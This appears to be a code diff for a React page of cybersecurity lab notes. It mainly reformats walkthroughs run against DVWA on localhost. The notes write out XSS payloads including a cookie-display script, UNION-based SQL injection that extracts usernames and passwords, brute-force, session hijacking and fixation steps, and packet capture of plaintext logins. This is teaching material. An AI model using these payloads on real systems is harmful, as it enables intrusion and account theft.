@@ -458,7 +458,7 @@ const CS_SECTIONS = [
   8. Action: Select Block the connection → Next.
   9. Profile: Select Domain, Private, Public → Next.
   10. Name the rule (example: Manual_Block_IP) → Finish.
-  
+
 
 ──────────
 
@@ -488,7 +488,7 @@ for row in mycsv:
             "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
         )
         subprocess.run(["PowerShell", "-Command", rule])
-        
+
         Sample Output:
           Added Rule to block: 45.9.148.221
           Added Rule to block: 103.17.48.5
@@ -499,7 +499,7 @@ for row in mycsv:
           1. Open Command Prompt and select Run as Administrator.
           (Firewall rules require admin rights.)
           2. Navigate to the folder where firewall.py is saved.
-          Example: cd C:\Users\YourName\Desktop
+          Example: cd C:\\Users\\YourName\\Desktop
           3. Make sure Python is installed: python --version
           4. install required library (if not already installed):- python -m pip install requests
           5. Execute the program: python firewall.py
@@ -507,10 +507,10 @@ for row in mycsv:
           Added Rule to block: 45.9.148.221
           Added Rule to block: 103.17.48.5
           For every IP, you will see:
-            o “Added Rule to block: <IP>”
+            o "Added Rule to block: <IP>"
             o PowerShell/Command Prompt will also show OK message for successful rule
             creation.
-            7. Cross-verify the rules:
+          7. Cross-verify the rules:
             o Open Windows Defender Firewall with Advanced Security
             o Go to Outbound Rules
             o Search for rule name: BadIP
@@ -519,211 +519,228 @@ for row in mycsv:
   {
     id: "xss",
     title: "XSS",
-    content: `
-      Aim
-        To identify and exploit Cross-Site Scripting (XSS) vulnerabilities in a vulnerable web application (DVWA) using Kali Linux.
+    content: `Aim
+  To identify and exploit Cross-Site Scripting (XSS) vulnerabilities in a vulnerable web application (DVWA) using Kali Linux.
 
-      Requirements
-        Kali Linux
-        DVWA (Damn Vulnerable Web Application)
-        Browser (Firefox/Chromium)
-        Apache & MySQL running
-      Step 1: Start DVWA Services
-        Open terminal:
-          sudo service apache2 start
-          sudo service mysql start
-        Open browser and go to:
-          http://localhost/dvwa
-          Login Credentials
-          Username: admin
-          Password: password
-        Set security level:
-          DVWA Security → Low → Submit
-      Step 2: Understanding XSS
-        XSS allows attackers to inject JavaScript code into a webpage that runs in another user’s browser.
-        Types in DVWA
-          Reflected XSS
-          Stored XSS
-          DOM Based XSS
-      Step 3: Reflected XSS Test
-        Go to:
-          DVWA → XSS (Reflected)
-        In the input box, type:
-          <script>alert('XSS')</script>
-        Click Submit.
-        Output
-          You will see a popup alert → XSS vulnerability confirmed.
+Requirements
+  Kali Linux
+  DVWA (Damn Vulnerable Web Application)
+  Browser (Firefox/Chromium)
+  Apache & MySQL running
 
-      Step 4: Stored XSS Test
-        Go to:
-          DVWA → XSS (Stored)
-        Fill the form:
-          Name:
-            <h1>Hacked</h1>
-          Message:
-            <script>alert('Stored XSS')</script>
-          Click:
-            Sign Guestbook
-          Refresh page → popup appears every time → Stored XSS successful.
+Step 1: Start DVWA Services
+  Open terminal:
+    sudo service apache2 start
+    sudo service mysql start
+  Open browser and go to:
+    http://localhost/dvwa
+    Login Credentials
+    Username: admin
+    Password: password
+  Set security level:
+    DVWA Security → Low → Submit
 
-      Step 5: DOM Based XSS
-        Go to:
-          DVWA → XSS (DOM)
-        In the URL bar add:
-         #<script>alert('DOM XSS')</script>
-        Press Enter → popup appears.
+Step 2: Understanding XSS
+  XSS allows attackers to inject JavaScript code into a webpage that runs in another user's browser.
+  Types in DVWA
+    Reflected XSS
+    Stored XSS
+    DOM Based XSS
 
-      Step 6: Capture Cookie (Lab Demo)
-        In Stored XSS Message box:
-          <script>alert(document.cookie)</script>
-        This shows session cookies (demo of session theft).
+Step 3: Reflected XSS Test
+  Go to:
+    DVWA → XSS (Reflected)
+  In the input box, type:
+    <script>alert('XSS')</script>
+  Click Submit.
+  Output
+    You will see a popup alert → XSS vulnerability confirmed.
 
-      Step 7: Change Security Level
-        Go to:
-          DVWA Security
-        Set:
-          Medium
-          High
-          Repeat the same payloads → see how filtering blocks them.
-      Result
-        XSS vulnerabilities were successfully identified and exploited in DVWA.
-`,
+Step 4: Stored XSS Test
+  Go to:
+    DVWA → XSS (Stored)
+  Fill the form:
+    Name:
+      <h1>Hacked</h1>
+    Message:
+      <script>alert('Stored XSS')</script>
+    Click:
+      Sign Guestbook
+    Refresh page → popup appears every time → Stored XSS successful.
+
+Step 5: DOM Based XSS
+  Go to:
+    DVWA → XSS (DOM)
+  In the URL bar add:
+    #<script>alert('DOM XSS')</script>
+  Press Enter → popup appears.
+
+Step 6: Capture Cookie (Lab Demo)
+  In Stored XSS Message box:
+    <script>alert(document.cookie)</script>
+  This shows session cookies (demo of session theft).
+
+Step 7: Change Security Level
+  Go to:
+    DVWA Security
+  Set:
+    Medium
+    High
+    Repeat the same payloads → see how filtering blocks them.
+
+Result
+  XSS vulnerabilities were successfully identified and exploited in DVWA.`,
   },
   {
     id: "packet",
     title: "Packet Tracing",
-    content: `
-      Step 1:
-        Open Kali Linux.
-      Step 2:
-        Open Terminal in Kali Linux.
-      Step 3:
-        Start a local HTTP server on port 8080 using:
-          python3 -m http.server 8080
-      Step 4:
-        In another new terminal start packet capture:
-          sudo tcpdump -i any -w capture.pcap port 8080
-      Step 5:
-        Open Firefox in Kali Linux and go to:
-          http://localhost:8080
-        Refresh the page to generate traffic.
-      Step 6:
-        Go back to tcpdump terminal.
-        Stop packet capturing by using:
-          Ctrl + C
-        It will stop and show how many packets were captured.
-        The packets are saved as:
-          capture.pcap
-      Step 7:
-        Click the Kali Linux dragon icon (top left).
-        Type: File Manager and open it.
-        Your Home folder will open.
-        You will see the file: capture.pcap.
-      Step 8:
-        Since Wireshark is pre-installed in Kali, just double-click capture.pcap.
-        The file will open directly in Wireshark for analysis.
-      Step 9:
-        Filter Login Packets
-        In Wireshark filter bar, type:
-        http.request.method == "POST"
-        Press Enter.
-        Now only important packets will show.
-      Step 10:
-        Click on any one of the packet and the following data is displayed.
-        Browser details such as:
-        OS
-        Browser version
-        Language
-        Visited URLs
-        are visible.
-        If a form is submitted, username and password can be seen in plain text.
-        This proves HTTP is insecure.
-      Conclusion
-        Packets were successfully captured and analyzed. Sensitive data is visible when HTTP is used.
-        Packet sniffing and network traffic analysis show that unencrypted communication is unsafe.
-        HTTPS is necessary to protect data.`,
+    content: `Step 1:
+  Open Kali Linux.
+
+Step 2:
+  Open Terminal in Kali Linux.
+
+Step 3:
+  Start a local HTTP server on port 8080 using:
+    python3 -m http.server 8080
+
+Step 4:
+  In another new terminal start packet capture:
+    sudo tcpdump -i any -w capture.pcap port 8080
+
+Step 5:
+  Open Firefox in Kali Linux and go to:
+    http://localhost:8080
+  Refresh the page to generate traffic.
+
+Step 6:
+  Go back to tcpdump terminal.
+  Stop packet capturing by using:
+    Ctrl + C
+  It will stop and show how many packets were captured.
+  The packets are saved as:
+    capture.pcap
+
+Step 7:
+  Click the Kali Linux dragon icon (top left).
+  Type: File Manager and open it.
+  Your Home folder will open.
+  You will see the file: capture.pcap.
+
+Step 8:
+  Since Wireshark is pre-installed in Kali, just double-click capture.pcap.
+  The file will open directly in Wireshark for analysis.
+
+Step 9:
+  Filter Login Packets
+  In Wireshark filter bar, type:
+    http.request.method == "POST"
+  Press Enter.
+  Now only important packets will show.
+
+Step 10:
+  Click on any one of the packet and the following data is displayed.
+  Browser details such as:
+    OS
+    Browser version
+    Language
+    Visited URLs
+  are visible.
+  If a form is submitted, username and password can be seen in plain text.
+  This proves HTTP is insecure.
+
+Conclusion
+  Packets were successfully captured and analyzed. Sensitive data is visible when HTTP is used.
+  Packet sniffing and network traffic analysis show that unencrypted communication is unsafe.
+  HTTPS is necessary to protect data.`,
   },
   {
     id: "sqli",
     title: "SQL Injection",
-    content: `
-    1. Aim of the Experiment:
-      To understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract database information.
-    2. Requirements
-      Kali Linux (VM or bare metal)
-      DVWA or WebGoat
-      Apache & MySQL (MariaDB)
-      Web browser (Firefox)
-      Basic SQL knowledge
-    3. Setting Up DVWA in Kali Linux
-      Step 1: Install DVWA
-        sudo apt update
-        sudo apt install dvwa -y
-      Step 2: Start Required Services
-        sudo service apache2 start
-        sudo service mysql start
-      Step 3: Configure DVWA
-        Edit config file:
-        sudo nano /etc/dvwa/config.inc.php
-        Ensure:
-          $_DVWA['db_password'] = '';
-        Save and exit.
-      Step 4: Open DVWA in Browser (Firefox)
-        http://127.0.0.1/dvwa
-        Login Credentials
-        Username: admin
-        Password: password
-        Click Create / Reset Database.
-      Step 5: Set Security Level
-        Go to DVWA Security
-        Set Security Level = Low
-        Click Submit
-    4. SQL Injection Attack on DVWA
-      Step 6: Navigate to SQL Injection Module
-        DVWA → Vulnerabilities → SQL Injection
-        You will see an input box asking for User ID.
-    5. Basic SQL Injection Test
-      Step 7: Normal Input
-        1
-        Displays user details normally.
-      Step 8: Authentication Bypass
-        Enter:
-          1' OR '1'='1
-      Result:
-        All user records are displayed
-        Confirms SQL Injection vulnerability
-    6. SQL Injection – Database Enumeration
-      Step 9: Find Number of Columns
-        1' ORDER BY 1-- -
-        1' ORDER BY 2-- -
-        1' ORDER BY 3-- -
-        Stop when error occurs.
-      Last successful number = total columns.
-      Step 10: UNION-Based Injection
-        1' UNION SELECT 1,2-- -
-      Step 11: Extract Database Name
-        1' UNION SELECT database(),2-- -
-      Step 12: Extract Table Names
-        1' UNION SELECT table_name,2
-        FROM information_schema.tables
-        WHERE table_schema=database()-- -
-      Step 13: Extract Column Names
-        1' UNION SELECT column_name,2
-        FROM information_schema.columns
-        WHERE table_name='users'-- -
-      Step 14: Extract Username & Password
-        1' UNION SELECT user,password FROM users-- -
-        Passwords may appear as hashes.
-    7. Result
-      The SQL Injection attack was successfully performed, demonstrating:
-        Authentication bypass
-        Unauthorized data access
-        Poor input validation vulnerability
-    8. Conclusion
-      This experiment proves that:
-        Unsanitized user input leads to SQL Injection
-        Attackers can extract sensitive database information
-        Proper security controls are mandatory`,
+    content: `1. Aim of the Experiment:
+  To understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract database information.
+
+2. Requirements
+  Kali Linux (VM or bare metal)
+  DVWA or WebGoat
+  Apache & MySQL (MariaDB)
+  Web browser (Firefox)
+  Basic SQL knowledge
+
+3. Setting Up DVWA in Kali Linux
+  Step 1: Install DVWA
+    sudo apt update
+    sudo apt install dvwa -y
+  Step 2: Start Required Services
+    sudo service apache2 start
+    sudo service mysql start
+  Step 3: Configure DVWA
+    Edit config file:
+    sudo nano /etc/dvwa/config.inc.php
+    Ensure:
+      $_DVWA['db_password'] = '';
+    Save and exit.
+  Step 4: Open DVWA in Browser (Firefox)
+    http://127.0.0.1/dvwa
+    Login Credentials
+    Username: admin
+    Password: password
+    Click Create / Reset Database.
+  Step 5: Set Security Level
+    Go to DVWA Security
+    Set Security Level = Low
+    Click Submit
+
+4. SQL Injection Attack on DVWA
+  Step 6: Navigate to SQL Injection Module
+    DVWA → Vulnerabilities → SQL Injection
+    You will see an input box asking for User ID.
+
+5. Basic SQL Injection Test
+  Step 7: Normal Input
+    1
+    Displays user details normally.
+  Step 8: Authentication Bypass
+    Enter:
+      1' OR '1'='1
+  Result:
+    All user records are displayed
+    Confirms SQL Injection vulnerability
+
+6. SQL Injection – Database Enumeration
+  Step 9: Find Number of Columns
+    1' ORDER BY 1-- -
+    1' ORDER BY 2-- -
+    1' ORDER BY 3-- -
+    Stop when error occurs.
+  Last successful number = total columns.
+  Step 10: UNION-Based Injection
+    1' UNION SELECT 1,2-- -
+  Step 11: Extract Database Name
+    1' UNION SELECT database(),2-- -
+  Step 12: Extract Table Names
+    1' UNION SELECT table_name,2
+    FROM information_schema.tables
+    WHERE table_schema=database()-- -
+  Step 13: Extract Column Names
+    1' UNION SELECT column_name,2
+    FROM information_schema.columns
+    WHERE table_name='users'-- -
+  Step 14: Extract Username & Password
+    1' UNION SELECT user,password FROM users-- -
+    Passwords may appear as hashes.
+
+7. Result
+  The SQL Injection attack was successfully performed, demonstrating:
+    Authentication bypass
+    Unauthorized data access
+    Poor input validation vulnerability
+
+8. Conclusion
+  This experiment proves that:
+    Unsanitized user input leads to SQL Injection
+    Attackers can extract sensitive database information
+    Proper security controls are mandatory`,
   },
   {
     id: "phishing",
@@ -745,101 +762,102 @@ Step 6: Open VirusTotal → Paste URL → Check results`,
     title: "Password Strength Checker",
     content: `import re
 def check_password_strength(password):
- if len(password) < 8:
- return "Weak: Password must be at least 8 characters long."
+    if len(password) < 8:
+        return "Weak: Password must be at least 8 characters long."
 
- if not any(char.isdigit() for char in password):
- return "Weak: Password must include at least one number."
+    if not any(char.isdigit() for char in password):
+        return "Weak: Password must include at least one number."
 
- if not any(char.isupper() for char in password):
- return "Weak: Password must include at least one uppercase letter."
+    if not any(char.isupper() for char in password):
+        return "Weak: Password must include at least one uppercase letter."
 
- if not any(char.islower() for char in password):
- return "Weak: Password must include at least one lowercase letter."
+    if not any(char.islower() for char in password):
+        return "Weak: Password must include at least one lowercase letter."
 
- if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
- return "Medium: Add special characters to make your password stronger."
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return "Medium: Add special characters to make your password stronger."
 
- return "Strong: Your password is secure!"
+    return "Strong: Your password is secure!"
+
 def password_checker():
- print("Welcome to the Password Strength Checker!")
- while True:
- password = input("\nEnter your password (or type 'exit' to quit): ")
+    print("Welcome to the Password Strength Checker!")
+    while True:
+        password = input("\\nEnter your password (or type 'exit' to quit): ")
 
- if password.lower() == "exit":
- print("Thank you for using the Password Strength Checker! Goodbye!")
- break
+        if password.lower() == "exit":
+            print("Thank you for using the Password Strength Checker! Goodbye!")
+            break
 
- result = check_password_strength(password)
- print(result)
+        result = check_password_strength(password)
+        print(result)
+
 if __name__ == "__main__":
- password_checker()`,
+    password_checker()`,
   },
   {
     id: "session-auth",
     title: "Session Authentication",
-    content: `
-    AIM
-      To identify and analyze authentication weaknesses and session management vulnerabilities using DVWA in Kali Linux.
+    content: `AIM
+  To identify and analyze authentication weaknesses and session management vulnerabilities using DVWA in Kali Linux.
 
-    REQUIREMENTS
-      Software
-      Kali Linux
-      DVWA (Pre-installed on lab systems)
-      Web Browser (Firefox)
-      Hardware
-      Computer System with Internet Disabled (Lab Setup)
-    THEORY
-      Authentication Weakness
-      Authentication ensures that only valid users can log in. Weak authentication occurs due to:
+REQUIREMENTS
+  Software
+    Kali Linux
+    DVWA (Pre-installed on lab systems)
+    Web Browser (Firefox)
+  Hardware
+    Computer System with Internet Disabled (Lab Setup)
+
+THEORY
+  Authentication Weakness
+    Authentication ensures that only valid users can log in. Weak authentication occurs due to:
       Weak passwords
       No account lockout
       Brute force vulnerability
       Default credentials
-      Session Management
-      Session management handles user sessions using session IDs. Improper session handling leads to:
+  Session Management
+    Session management handles user sessions using session IDs. Improper session handling leads to:
       Session hijacking
       Session fixation
       Reuse of old session IDs
       Insecure cookies
-    PROCEDURE
-    PART A: Launch DVWA
-    Step 1: Start Required Services
 
+PROCEDURE
+PART A: Launch DVWA
+  Step 1: Start Required Services
     Open terminal and start Apache and MySQL:
-
-    sudo service apache2 start
-    sudo service mysql start
-    Step 2: Open DVWA in Browser
-      Open Firefox and enter:
-        http://127.0.0.1/dvwa
-    Step 3: Login to DVWA
+      sudo service apache2 start
+      sudo service mysql start
+  Step 2: Open DVWA in Browser
+    Open Firefox and enter:
+      http://127.0.0.1/dvwa
+  Step 3: Login to DVWA
     Use default credentials:
       Username: admin
       Password: password
-    Step 4: Set Security Level
-      Go to DVWA Security
-      Select LOW
-      Click Submit
+  Step 4: Set Security Level
+    Go to DVWA Security
+    Select LOW
+    Click Submit
 
-    PART B: Testing Authentication Weaknesses
-      Experiment 1: Weak Password Authentication
-        Step 1: Open Brute Force Module
-        Navigate to:
-          DVWA → Vulnerabilities → Brute Force
-      Step 2: Try Common Passwords
-        Enter:
-          Username: admin
-          Password: password
-        Observation
-          Successful login indicates weak authentication.
+PART B: Testing Authentication Weaknesses
+  Experiment 1: Weak Password Authentication
+    Step 1: Open Brute Force Module
+      Navigate to:
+        DVWA → Vulnerabilities → Brute Force
+    Step 2: Try Common Passwords
+      Enter:
+        Username: admin
+        Password: password
+      Observation
+        Successful login indicates weak authentication.
 
-      Experiment 2: Manual Brute Force Attack
-        Enter Username (Same Every Time)
-        In Username field, type:
-          admin
-        Do NOT change username.
-        Step 3: Try Passwords ONE BY ONE
+  Experiment 2: Manual Brute Force Attack
+    Enter Username (Same Every Time)
+    In Username field, type:
+      admin
+    Do NOT change username.
+    Step 3: Try Passwords ONE BY ONE
       Attempt 1
         Username: admin
         Password: admin
@@ -858,136 +876,151 @@ if __name__ == "__main__":
         Click Login.
         ✅ LOGIN SUCCESSFUL
 
-      Step 4: Observe What Happened
-        DVWA did NOT block you
-        DVWA did NOT lock account
-        DVWA allowed unlimited attempts
+    Step 4: Observe What Happened
+      DVWA did NOT block you
+      DVWA did NOT lock account
+      DVWA allowed unlimited attempts
+      This is called Brute Force Vulnerability.
 
-        This is called Brute Force Vulnerability.
-
-      PART C: Testing Session Management Vulnerabilities
-      Experiment 3: Session ID Analysis
-      Step 1: Login to DVWA
-        Open browser developer tools:
-          Right Click → Inspect → Storage → Cookies
-      Step 2: Observe Session Cookie
-        Look for:
-          PHPSESSID
-        Observation
-          Session ID is visible and not encrypted.
-        Example:
-          PHPSESSID : 5f6194766020dcaa2c906358cbd2941b
-`,
+PART C: Testing Session Management Vulnerabilities
+  Experiment 3: Session ID Analysis
+    Step 1: Login to DVWA
+      Open browser developer tools:
+        Right Click → Inspect → Storage → Cookies
+    Step 2: Observe Session Cookie
+      Look for:
+        PHPSESSID
+      Observation
+        Session ID is visible and not encrypted.
+      Example:
+        PHPSESSID : 5f6194766020dcaa2c906358cbd2941b`,
   },
   {
     id: "session-hijack",
     title: "Session Hijacking",
     content: `Session Hijacking
-        BEFORE YOU START
-        DVWA security level = LOW
-        You are logged in as admin in DVWA
-        Step 1: Open DVWA (Victim Session)
-          Open Firefox
-          Go to:
-          http://127.0.0.1/dvwa
-          Login:
-          Username: admin
-          Password: password
-          Stay logged in (do NOT logout)
-          This browser is the Victim.
-        Step 2: Copy the Session ID (PHPSESSID)
-          Right click → Inspect
-          Click Storage tab
-          Click Cookies
-          Select:
-          http://127.0.0.1
-          You will see:
-          PHPSESSID a8c9f7e3d4b1...
-          Copy the PHPSESSID value.
-          This value is the session ID (user identity).
-        Step 3: Open Attacker Browser (Private Window)
-          Press:
-          Ctrl + Shift + P
-          Private Window opens.
-          Do NOT login here.
-        Step 4: Paste Session ID in Attacker Browser
-          In Private Window, go to:
-          http://127.0.0.1/dvwa
-          Right click → Inspect
-          Go to Storage → Cookies
-          Replace PHPSESSID with copied value
-          Press Enter
-        Step 5: Refresh Page
-          Refresh using:
-          F5
-          You are logged in as admin without username or password.
-          Result
-          Attacker gains access without login → Session Hijacking.
-        Experiment 5: Session Fixation
-          IMPORTANT CONDITIONS
-          DVWA Security Level = LOW
-          Use only ONE browser window
-          Do NOT use Private Window
-          Step 1: Open DVWA WITHOUT Login
-            Go to:
-            http://127.0.0.1/dvwa/
-            Do NOT login.
-          Step 2: Note the Session ID (Before Login)
-            Inspect → Storage → Cookies → http://127.0.0.1
-            Example:
-            PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
-          Step 3: Login WITHOUT Closing Browser
-            Enter:
-            Username: admin
-            Password: password
-            Click Login.
-          Step 4: Check Session ID AGAIN (After Login)
-            Observe PHPSESSID carefully.
-            Case 1 (VULNERABLE – DVWA LOW)
-              Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
-              After Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
-              Same value → Session Fixation exists.
-            Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE)
-              Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
-              After Login PHPSESSID = be2d584526b42fef6742d5cf95ce008f
-              Session regenerated → No session fixation.
-        Experiment 6
-          CONDITIONS
-            DVWA Security Level = LOW
-            Must know how to view cookies
-          Step 1: Login Normally
-            Go to:
-              http://127.0.0.1/dvwa/
-            Login using:
-              Username: admin
-              Password: password
-          Step 2: Copy Session ID
-            Inspect → Storage → Cookies → http://127.0.0.1
-            Copy:
-              PHPSESSID = be2d584526b42fef6742d5cf95ce008f
-          Step 3: Logout from DVWA
-            Click Logout.
-            You will see login page.
-          Step 4: Reuse OLD Session ID
-            Option A (Exam Safe)
-            Open Private Window
-            Ctrl + Shift + P
-            Go to:
-              http://127.0.0.1/dvwa/
-            Open Inspect → Storage → Cookies
-            Paste OLD PHPSESSID
-            Press Enter
-          Step 5: Open Internal Page
-            Open:
-              http://127.0.0.1/dvwa/index.php
-              or
-              http://127.0.0.1/dvwa/vulnerabilities/brute/
-              Do NOT login.
-              Expected Result (DVWA LOW)
-              Logged in again
-              Without login
-              Using old session ID
-              Logout did NOT destroy session`,
+
+BEFORE YOU START
+  DVWA security level = LOW
+  You are logged in as admin in DVWA
+
+Step 1: Open DVWA (Victim Session)
+  Open Firefox
+  Go to:
+    http://127.0.0.1/dvwa
+  Login:
+    Username: admin
+    Password: password
+  Stay logged in (do NOT logout)
+  This browser is the Victim.
+
+Step 2: Copy the Session ID (PHPSESSID)
+  Right click → Inspect
+  Click Storage tab
+  Click Cookies
+  Select:
+    http://127.0.0.1
+  You will see:
+    PHPSESSID a8c9f7e3d4b1...
+  Copy the PHPSESSID value.
+  This value is the session ID (user identity).
+
+Step 3: Open Attacker Browser (Private Window)
+  Press:
+    Ctrl + Shift + P
+  Private Window opens.
+  Do NOT login here.
+
+Step 4: Paste Session ID in Attacker Browser
+  In Private Window, go to:
+    http://127.0.0.1/dvwa
+  Right click → Inspect
+  Go to Storage → Cookies
+  Replace PHPSESSID with copied value
+  Press Enter
+
+Step 5: Refresh Page
+  Refresh using:
+    F5
+  You are logged in as admin without username or password.
+  Result
+    Attacker gains access without login → Session Hijacking.
+
+Experiment 5: Session Fixation
+  IMPORTANT CONDITIONS
+    DVWA Security Level = LOW
+    Use only ONE browser window
+    Do NOT use Private Window
+
+  Step 1: Open DVWA WITHOUT Login
+    Go to:
+      http://127.0.0.1/dvwa/
+    Do NOT login.
+
+  Step 2: Note the Session ID (Before Login)
+    Inspect → Storage → Cookies → http://127.0.0.1
+    Example:
+      PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
+
+  Step 3: Login WITHOUT Closing Browser
+    Enter:
+      Username: admin
+      Password: password
+    Click Login.
+
+  Step 4: Check Session ID AGAIN (After Login)
+    Observe PHPSESSID carefully.
+    Case 1 (VULNERABLE – DVWA LOW)
+      Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
+      After Login  PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
+      Same value → Session Fixation exists.
+    Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE)
+      Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
+      After Login  PHPSESSID = be2d584526b42fef6742d5cf95ce008f
+      Session regenerated → No session fixation.
+
+Experiment 6
+  CONDITIONS
+    DVWA Security Level = LOW
+    Must know how to view cookies
+
+  Step 1: Login Normally
+    Go to:
+      http://127.0.0.1/dvwa/
+    Login using:
+      Username: admin
+      Password: password
+
+  Step 2: Copy Session ID
+    Inspect → Storage → Cookies → http://127.0.0.1
+    Copy:
+      PHPSESSID = be2d584526b42fef6742d5cf95ce008f
+
+  Step 3: Logout from DVWA
+    Click Logout.
+    You will see login page.
+
+  Step 4: Reuse OLD Session ID
+    Option A (Exam Safe)
+    Open Private Window
+      Ctrl + Shift + P
+    Go to:
+      http://127.0.0.1/dvwa/
+    Open Inspect → Storage → Cookies
+    Paste OLD PHPSESSID
+    Press Enter
+
+  Step 5: Open Internal Page
+    Open:
+      http://127.0.0.1/dvwa/index.php
+      or
+      http://127.0.0.1/dvwa/vulnerabilities/brute/
+    Do NOT login.
+    Expected Result (DVWA LOW)
+      Logged in again
+      Without login
+      Using old session ID
+      Logout did NOT destroy session`,
   },
   {
     id: "dvwa",
@@ -1066,7 +1099,7 @@ PHASE 3: Capture HTTPS Traffic
   Step 1: Burp → Proxy → Options → Import/Export CA Certificate
           Export Certificate (DER format) → Save as burpcer.der
   Step 2: Send to Emulator:
-    cd C:\Users\...\platform-tools
+    cd C:\\Users\\...\\platform-tools
     adb push burpcer.der /sdcard/Download/
   Step 3: Emulator → Settings → Security & Privacy
           → Encryption & Credentials → Install Certificate
@@ -1266,71 +1299,47 @@ Recommendations:
   },
 ];
 
-function CCSection({ section, idx }) {
+function Section({ section, idx }) {
   const [open, setOpen] = useState(false);
   return (
-    <div style={{ borderBottom: "1px solid #ccc", padding: "8px 0" }}>
+    <div style={{ borderBottom: "1px solid #e0e0e0", padding: "8px 0" }}>
       <div
         onClick={() => setOpen((o) => !o)}
-        style={{ cursor: "pointer", display: "flex", gap: "12px", alignItems: "center" }}
+        style={{
+          cursor: "pointer",
+          display: "flex",
+          gap: "12px",
+          alignItems: "center",
+          padding: "4px 0",
+        }}
       >
-        <span style={{ fontFamily: "monospace", fontSize: "13px", color: "#666" }}>
+        <span style={{ fontFamily: "monospace", fontSize: "13px", color: "#888" }}>
           {String(idx + 1).padStart(2, "0")}
         </span>
-        <span style={{ fontFamily: "monospace", fontSize: "15px" }}>{section.title}</span>
-        <span style={{ marginLeft: "auto", fontFamily: "monospace", fontSize: "13px" }}>
+        <span style={{ fontFamily: "monospace", fontSize: "15px", color: "#000" }}>
+          {section.title}
+        </span>
+        <span style={{ marginLeft: "auto", fontFamily: "monospace", fontSize: "13px", color: "#000" }}>
           {open ? "−" : "+"}
         </span>
       </div>
       {open && (
-        <pre style={{
-          marginTop: "10px",
-          fontFamily: "monospace",
-          fontSize: "13px",
-          lineHeight: "1.7",
-          whiteSpace: "pre-wrap",
-          wordBreak: "break-word",
-          background: "#f5f5f5",
-          padding: "16px",
-          border: "1px solid #ddd",
-          borderRadius: "4px",
-        }}>
-          {section.content}
-        </pre>
-      )}
-    </div>
-  );
-}
-
-function CSSection({ section, idx }) {
-  const [open, setOpen] = useState(false);
-  return (
-    <div style={{ borderBottom: "1px solid #ccc", padding: "8px 0" }}>
-      <div
-        onClick={() => setOpen((o) => !o)}
-        style={{ cursor: "pointer", display: "flex", gap: "12px", alignItems: "center" }}
-      >
-        <span style={{ fontFamily: "monospace", fontSize: "13px", color: "#666" }}>
-          {String(idx + 1).padStart(2, "0")}
-        </span>
-        <span style={{ fontFamily: "monospace", fontSize: "15px" }}>{section.title}</span>
-        <span style={{ marginLeft: "auto", fontFamily: "monospace", fontSize: "13px" }}>
-          {open ? "−" : "+"}
-        </span>
-      </div>
-      {open && (
-        <pre style={{
-          marginTop: "10px",
-          fontFamily: "monospace",
-          fontSize: "13px",
-          lineHeight: "1.7",
-          whiteSpace: "pre-wrap",
-          wordBreak: "break-word",
-          background: "#f5f5f5",
-          padding: "16px",
-          border: "1px solid #ddd",
-          borderRadius: "4px",
-        }}>
+        <pre
+          style={{
+            marginTop: "10px",
+            fontFamily: "monospace",
+            fontSize: "13px",
+            lineHeight: "1.7",
+            whiteSpace: "pre-wrap",
+            wordBreak: "break-word",
+            background: "#f7f7f7",
+            color: "#000",
+            padding: "16px",
+            border: "1px solid #e0e0e0",
+            borderRadius: "4px",
+            textAlign: "left",
+          }}
+        >
           {section.content}
         </pre>
       )}
@@ -1346,40 +1355,89 @@ export default function App() {
     fontFamily: "monospace",
     fontSize: "14px",
     cursor: "pointer",
-    background: "none",
     border: "1px solid #ccc",
-    borderBottom: active ? "1px solid white" : "1px solid #ccc",
+    borderBottom: active ? "1px solid #fff" : "1px solid #ccc",
     borderRadius: "4px 4px 0 0",
     marginBottom: "-1px",
-    background: active ? "white" : "transparent",
+    background: active ? "#fff" : "#f0f0f0",
+    color: "#000",
     fontWeight: active ? "bold" : "normal",
   });
 
   return (
-    <div style={{ maxWidth: "860px", margin: "0 auto", padding: "32px 24px 80px", fontFamily: "monospace" }}>
-      {/* Tabs */}
-      <div style={{ display: "flex", gap: "4px", borderBottom: "1px solid #ccc", marginBottom: "32px" }}>
-        <button style={tabStyle(tab === "cc")} onClick={() => setTab("cc")}>CC</button>
-        <button style={tabStyle(tab === "cs")} onClick={() => setTab("cs")}>CS</button>
+    <div
+      style={{
+        minHeight: "100vh",
+        background: "#fff",
+        color: "#000",
+      }}
+    >
+      <div
+        style={{
+          maxWidth: "860px",
+          margin: "0 auto",
+          padding: "32px 24px 80px",
+          fontFamily: "monospace",
+          background: "#fff",
+          color: "#000",
+          textAlign: "left",
+        }}
+      >
+        {/* Tabs */}
+        <div
+          style={{
+            display: "flex",
+            gap: "4px",
+            borderBottom: "1px solid #ccc",
+            marginBottom: "32px",
+          }}
+        >
+          <button style={tabStyle(tab === "cc")} onClick={() => setTab("cc")}>
+            CC
+          </button>
+          <button style={tabStyle(tab === "cs")} onClick={() => setTab("cs")}>
+            CS
+          </button>
+        </div>
+
+        {tab === "cc" && (
+          <div>
+            <h2
+              style={{
+                fontFamily: "monospace",
+                fontSize: "28px",
+                marginBottom: "24px",
+                color: "#000",
+                textAlign: "left",
+              }}
+            >
+              CC
+            </h2>
+            {CC_SECTIONS.map((s, i) => (
+              <Section key={s.id} section={s} idx={i} />
+            ))}
+          </div>
+        )}
+
+        {tab === "cs" && (
+          <div>
+            <h2
+              style={{
+                fontFamily: "monospace",
+                fontSize: "28px",
+                marginBottom: "24px",
+                color: "#000",
+                textAlign: "left",
+              }}
+            >
+              CS
+            </h2>
+            {CS_SECTIONS.map((s, i) => (
+              <Section key={s.id} section={s} idx={i} />
+            ))}
+          </div>
+        )}
       </div>
-
-      {tab === "cc" && (
-        <div>
